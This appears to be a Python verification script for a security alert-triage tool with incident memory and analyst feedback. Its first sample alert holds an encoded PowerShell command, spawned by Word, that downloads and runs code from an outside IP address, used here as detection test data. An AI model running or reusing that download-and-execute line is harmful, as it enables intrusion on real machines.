import sys
import os
import json
import time

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from backend.app.schemas.alert import AlertInput
from backend.app.schemas.feedback import FeedbackInput
from backend.app.services.investigation_service import investigation_service
from backend.app.services.feedback_service import feedback_service
from backend.app.services.hindsight_service import hindsight_service

def final_verification():
    print("=" * 75)
    print("SENTINEL MEMORY - FINAL END-TO-END HINDSIGHT VERIFICATION")
    print("=" * 75)

    # ----------------------------------------------------
    # STEP 4, 5, 6, 7: INVESTIGATION WITH PHISHING MACRO ALERT
    # ----------------------------------------------------
    print("\n>>> STEP 4: INVESTIGATING PHISHING DOCUMENT MACRO ALERT (ALT-1042)...")
    alert1 = AlertInput(
        alert_id="ALT-1042",
        host="FINANCE-PC-17",
        severity="HIGH",
        process="powershell.exe",
        parent_process="winword.exe",
        command="powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAJwApAA==",
        destination="185.220.101.5:443",
        timestamp="2026-09-28 14:32:00",
        user="CORP\\jsmith"
    )

    # 5. Direct recall call to inspect raw Hindsight memory units
    query1 = investigation_service.construct_recall_query(alert1)
    print(f"\n[QUERY SENT TO HINDSIGHT RECALL]:\n{query1[:150]}...")

    raw_memories = hindsight_service.recall(query=query1, max_tokens=4096)
    print(f"\n>>> STEP 5 & 6: HINDSIGHT RECALL RETURNED {len(raw_memories)} MEMORY UNITS FROM CLOUD BANK.")
    print("--- TOP 5 ACTUAL RECALLED MEMORY UNITS FROM HINDSIGHT CLOUD ---")
    for idx, mem in enumerate(raw_memories[:5], 1):
        print(f"\n[Memory #{idx}]")
        print(f"  Memory Unit ID : {mem.get('id')}")
        print(f"  Incident Ref   : {mem.get('document_id')}")
        print(f"  Recall Score   : {mem.get('score')}")
        print(f"  Semantic Text  : {mem.get('text')}")

    # 7. Run investigation pipeline and verify integration
    print("\n>>> STEP 7: INVESTIGATION PIPELINE SYNTHESIS RESULT:")
    result1 = investigation_service.investigate(alert1)
    print(f"  Alert ID        : {result1.alert_id}")
    print(f"  Risk Level      : {result1.risk_level}")
    print(f"  Confidence      : {result1.confidence}")
    print(f"  Memory Used     : {result1.memory_used}")
    print(f"  Recalled Count  : {result1.memory_count}")
    print(f"  Executive Summary: {result1.summary}")
    print("  Reasoning Bullets:")
    for r in result1.reasoning:
        print(f"    * {r}")

    # ----------------------------------------------------
    # STEP 8 & 9: SUBMIT ANALYST FEEDBACK TO HINDSIGHT
    # ----------------------------------------------------
    print("\n" + "=" * 75)
    print(">>> STEP 8 & 9: SUBMITTING ANALYST FEEDBACK & RETAINING IN HINDSIGHT...")
    print("=" * 75)
    fb_input = FeedbackInput(
        alert_id="ALT-1088",
        verdict="FALSE_POSITIVE",
        comments="Approved document archiver routine doc_archiver.ps1 on BACKUP-SRV-01 verified by Senior Lead Analyst.",
        analyst_name="Senior Lead SOC Analyst",
        action_taken="Approved corporate template sync exception; updated EDR playbook"
    )

    fb_result = feedback_service.process_feedback(fb_input)
    print(f"  Feedback Submission ID: {fb_result.feedback_id}")
    print(f"  Retained in Hindsight Cloud : {fb_result.retained_in_hindsight}")
    print(f"  Hindsight Operation Message : {fb_result.message}")

    print("\nPausing 3 seconds for Hindsight memory indexing...")
    time.sleep(3)

    # ----------------------------------------------------
    # STEP 10, 11, 12: SECOND INVESTIGATION RECALLS FEEDBACK
    # ----------------------------------------------------
    print("\n" + "=" * 75)
    print(">>> STEP 10, 11, 12: RUNNING SECOND RELATED INVESTIGATION (ALT-1140)...")
    print("=" * 75)
    alert2 = AlertInput(
        alert_id="ALT-1140",
        host="FINANCE-PC-18",
        severity="HIGH",
        process="powershell.exe",
        parent_process="winword.exe",
        command="powershell.exe -ExecutionPolicy Bypass -Command & { [EnterpriseDocGen.Tool]::SyncTemplate('finance_q4_budget') }",
        destination="10.20.30.40:443",
        timestamp="2026-09-28 16:05:00",
        user="CORP\\tgreene"
    )

    result2 = investigation_service.investigate(alert2)

    print(f"  Second Alert ID : {result2.alert_id}")
    print(f"  Risk Level      : {result2.risk_level} (Adjusted by Hindsight Memory Precedent!)")
    print(f"  Confidence      : {result2.confidence}")
    print(f"  Memory Used     : {result2.memory_used}")
    print(f"  Recalled Count  : {result2.memory_count}")
    print(f"  Executive Summary: {result2.summary}")
    print("  Differential Reasoning Influenced by Hindsight:")
    for r in result2.reasoning:
        print(f"    * {r}")

    # Step 11: Direct verification of recalled feedback in memory
    print("\n>>> STEP 11 DETAIL: DIRECT VERIFICATION OF RECALLED FEEDBACK IN HINDSIGHT:")
    fb_recall = hindsight_service.recall(query="Senior Lead SOC Analyst approved corporate template sync exception doc_archiver.ps1")
    print(f"  Total feedback memories matched: {len(fb_recall)}")
    if len(fb_recall) > 0:
        top_fb = fb_recall[0]
        print(f"  Top Match ID   : {top_fb.get('id')}")
        print(f"  Match Score    : {top_fb.get('score')}")
        print(f"  Retained Text  : {top_fb.get('text')[:200]}...")

    print("\n" + "=" * 75)
    print("FINAL HINDSIGHT VERIFICATION COMPLETED SUCCESSFULLY")
    print("=" * 75)

if __name__ == "__main__":
    final_verification()
